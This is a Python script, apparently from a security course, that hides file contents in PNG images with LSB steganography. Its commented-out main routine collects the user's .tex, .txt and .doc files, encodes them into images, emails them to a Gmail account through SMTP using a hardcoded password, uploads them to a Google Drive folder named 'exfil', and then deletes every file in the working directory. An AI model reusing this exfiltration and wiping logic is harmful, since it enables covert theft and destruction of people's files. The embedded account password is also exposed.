# taken from this StackOverflow answer: https://stackoverflow.com/a/39225039
import requests
import os
import shutil
import numpy as np
from stegano import lsb
from PIL import Image
# from pydrive.auth import GoogleAuth
# from pydrive.drive import GoogleDrive
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import textract


class drive:
    def download_file_from_google_drive(self, id, destination):
        URL = "https://docs.google.com/uc?export=download"

        session = requests.Session()

        response = session.get(URL, params={'id': id}, stream=True)
        token = self.get_confirm_token(response)

        if token:
            params = {'id': id, 'confirm': token}
            response = session.get(URL, params=params, stream=True)

        self.save_response_content(response, destination)

    def get_confirm_token(self, response):
        for key, value in response.cookies.items():
            if key.startswith('download_warning'):
                return value
        return None

    def save_response_content(self, response, destination):
        CHUNK_SIZE = 32768

        with open(destination, "wb") as f:
            for chunk in response.iter_content(CHUNK_SIZE):
                if chunk:  # filter out keep-alive new chunks
                    f.write(chunk)


# -----------------------------------------------------------
class steg:
    def Encode(self, src, message, dest):

        img = Image.open(src, 'r')
        width, height = img.size
        array = np.array(list(img.getdata()))

        if img.mode == 'RGB':
            n = 3
        elif img.mode == 'RGBA':
            n = 4
        total_pixels = array.size // n

        message += "$t3g0"
        b_message = ''.join([format(ord(i), "08b") for i in message])
        req_pixels = len(b_message)

        if req_pixels > total_pixels:
            print("ERROR: Need larger file size")

        else:
            index = 0
            for p in range(total_pixels):
                for q in range(0, 3):
                    if index < req_pixels:
                        array[p][q] = int(bin(array[p][q])[2:9] + b_message[index], 2)
                        index += 1

            array = array.reshape(height, width, n)
            enc_img = Image.fromarray(array.astype('uint8'), img.mode)
            enc_img.save(dest)
            print("Image Encoded Successfully")

    def Decode(self, src):

        img = Image.open(src, 'r')
        array = np.array(list(img.getdata()))

        if img.mode == 'RGB':
            n = 3
        elif img.mode == 'RGBA':
            n = 4
        total_pixels = array.size // n

        hidden_bits = ""
        for p in range(total_pixels):
            for q in range(0, 3):
                hidden_bits += (bin(array[p][q])[2:][-1])

        hidden_bits = [hidden_bits[i:i + 8] for i in range(0, len(hidden_bits), 8)]

        message = ""
        for i in range(len(hidden_bits)):
            if message[-5:] == "$t3g0":
                break
            else:
                message += chr(int(hidden_bits[i], 2))
        if "$t3g0" in message:
            print("Hidden Message:", message[:-5])
        else:
            print("No Hidden Message Found")


# -------------------------------------------------------

class Email:
    def send_mail(fromaddr, toaddr, filename, path_of_the_file):
        # instance of MIMEMultipart
        msg = MIMEMultipart()

        # storing the senders email address
        msg['From'] = fromaddr

        # storing the receivers email address
        msg['To'] = toaddr

        # storing the subject
        msg['Subject'] = "Steganography completed"

        # string to store the body of the mail
        body = "Steganography completed at " + path_of_the_file

        # attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # open the file to be sent
        attachment = open(path_of_the_file, "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form
        p.set_payload((attachment).read())

        # encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'
        msg.attach(p)

        # creates SMTP session
        s = smtplib.SMTP('smtp.gmail.com', 587)

        # start TLS for security
        s.starttls()

        # Authentication
        s.login(fromaddr, "gg3730340")

        # Converts the Multipart msg into a string
        text = msg.as_string()

        # sending the mail
        s.sendmail(fromaddr, toaddr, text)

        print("Email sent to jimmyhwangcs590j")
        # terminating the session
        s.quit()


if __name__ == "__main__":
    dv = drive()
    cwd = os.getcwd()
    st = steg()

    st.Decode(cwd + '/' + 'potential_tex' + '.png')

    # text = textract.process(cwd + '/551hw2.doc', extension='docx')

    # print(text)

    # file_id_1 = '1XxaX3FGCughJhrz-H8GYhfkx4cCxyAwm'
    # file_id_2 = '1Mq-Nlz3lIc6CEZLSxVL-YlPEpWdr8V9O'
    # file_id_3 = '17wTBk-vfa7_fB4Mm3e3m_9RDnNiY9u5q'
    # file_id_4 = '1GLVkeszoXCH7HbE0cuEvjnVMfCAa8P1L'
    # destination_1 = cwd + '/PDF.png'
    # and many jpg as well?
    # destination_2 = cwd + '/DOC.png'
    # destination_3 = cwd + '/TEX.png'
    # destination_4 = cwd + '/TXT.png'
    # dv.download_file_from_google_drive(file_id_1, destination_1)
    # print("finding pics")
    # dv.download_file_from_google_drive(file_id_2, destination_2)
    # dv.download_file_from_google_drive(file_id_3, destination_3)
    # dv.download_file_from_google_drive(file_id_4, destination_4)

    # count = 0

    # with os.scandir(path=cwd) as it:
    #     for entry in it:
    #         # count = count + 1
    #         encode_string = ''
    #         new_path = ''
    #         if not entry.name.startswith('.') and entry.is_file():
    #             entry_name = entry.name

    #             # LaTeX Files
    #             if ".tex" in entry_name or ".sty" in entry_name:
    #                 count = count + 1
    #                 print(count)
    #                 print(entry_name)
    #                 with open(cwd + '/' + entry_name, 'rb') as f:
    #                     encode_string = f.read()
    #                 new_path = cwd + '/' + str(count) + '.png'

    #                 # Command and Control
    #                 # Encrypt/Encode this command
    #                 st.Encode(destination_3, str(encode_string), new_path)

    #             # Text Files
    #             elif ".txt" in entry_name:
    #                 count = count + 1
    #                 print(count)
    #                 print(entry_name)
    #                 with open(cwd + '/' + entry_name, 'rb') as f:
    #                     encode_string = f.read()
    #                 new_path = cwd + '/' + str(count) + '.png'
    #                 st.Encode(destination_4, str(encode_string), new_path)

    #             # MS Word Files
    #             elif ".doc" in entry_name or ".docx" in entry_name:
    #                 count = count + 1
    #                 print(count)
    #                 print(entry_name)
    #                 with open(cwd + '/' + entry_name, 'rb') as f:
    #                     encode_string = f.read()
    #                 new_path = cwd + '/' + str(count) + '.png'
    #                 st.Encode(destination_2, str(encode_string), new_path)

    # Testing to make sure encode and decode are working properly
    # encoded = ''
    # with open(cwd + '/1.png', 'rb') as f:
    #     encoded = f.read()
    # print(encoded)

    # Send email
    # fromaddr = "jimmyhwangcs590j@gmail.com"
    # toaddr = "jimmyhwangcs590j@gmail.com"

    # filenames = []
    # paths_of_the_files = []
    # for i in range(1, count + 1):
    #     fn = str(i) + '.png'
    #     filenames.append(fn)
    # print(filenames)

    # for filename in filenames:
    #     path_of_the_file = cwd + '/' + filename
    #     Email.send_mail(fromaddr, toaddr, filename, path_of_the_file)

    # ------------------
    # Delete Everything
    # Be careful!
    # ------------------

    # folder = cwd
    # for filename in os.listdir(folder):
    #     file_path = os.path.join(folder, filename)
    #     try:
    #         if os.path.isfile(file_path) or os.path.islink(file_path):
    #             os.unlink(file_path)
    #         elif os.path.isdir(file_path):
    #             shutil.rmtree(file_path)
    #     except Exception as e:
    #         print('Failed to delete %s. Reason: %s' % (file_path, e))

    

    # exfil_folder_id = '1bHs3wNd0aMNNfOwcsn4Ni6mYLSCR_UZn'

    # gauth = GoogleAuth()
    # drive = GoogleDrive(gauth)

    # upload_file_list = ['1.png']
    # for upload_file in upload_file_list:
    #     gfile = drive.CreateFile({'parents': [{'id': exfil_folder_id}]})
    #     # Read file and set it as the content of this instance.
    #     gfile.SetContentFile(upload_file)
    #     gfile.Upload() # Upload the file.
